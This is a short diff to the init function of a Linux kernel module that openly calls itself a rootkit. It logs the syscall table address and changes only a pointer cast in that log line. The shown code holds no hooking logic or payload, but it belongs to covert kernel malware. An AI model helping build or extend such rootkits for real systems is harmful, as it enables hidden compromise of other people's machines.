@@ -15,7 +15,7 @@
 static int __init main_init(void) {
 	int error;
 	printk(KERN_INFO "Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
-	printk(KERN_INFO "Syscall table is located at: %p\n", SYSCALL_TABLE);
+	printk(KERN_INFO "Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
 
 	
 	error = outputDevice_init();
